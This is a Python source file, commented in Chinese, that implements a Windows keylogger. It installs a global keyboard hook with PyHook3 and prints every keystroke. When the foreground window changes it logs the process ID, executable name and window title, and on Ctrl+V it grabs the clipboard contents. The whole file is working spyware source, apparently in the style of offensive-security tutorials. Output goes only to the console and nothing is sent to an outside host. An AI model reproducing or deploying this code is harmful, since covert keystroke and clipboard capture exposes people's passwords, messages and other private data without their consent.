from ctypes import *
import pythoncom
import PyHook3 as pyHook
import win32clipboard
import win32con

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()  # 获得前台窗口句柄
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    print(id(pid))
    print(type(byref(pid)))
    process_id = "%d" % pid.value  # 将进程ID存入变量中

    # 申请内存
    executable = create_string_buffer(1024)
    h_process = kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)  # 获得进程名

    # 读取窗口标题
    window_title = create_string_buffer(512)
    user32.GetWindowTextA(hwnd, byref(window_title), 512)  # 获得窗口名

    # 打印
    print()
    print("[PID: %s-%s-%s]" % (process_id, executable.value, window_title.value.decode("gbk")))
    print()

    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


# 定义击键监听事件函数
def key_event(event):
    global current_window
    if event.WindowName != current_window:  # 检查目标是否切换了窗口
        current_window = event.WindowName
        get_current_process()

    if event.Ascii > 32 and event.Ascii < 127:  # 检查是否为常规按键
        print(chr(event.Ascii), end=" ")

    else:
        if event.Key == "V":  # 如果是CTRL+V，则获取剪贴板内容
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[PASTE] - %s" % (pasted_value), end=' ')
        else:
            print("[%s]" % event.Key, end=' ')
    # 循环监听下一个敲键事件
    return True  # 返回到下一个钩子事件


def key_logger():
    hooker = pyHook.HookManager()  # 创建构造函数管理器
    hooker.KeyDown = key_event  # 注册钩子按键事件的处理函数
    hooker.HookKeyboard()  # 创建键盘钩子
    pythoncom.PumpMessages()  # 执行


if __name__ == "__main__":
    key_logger()


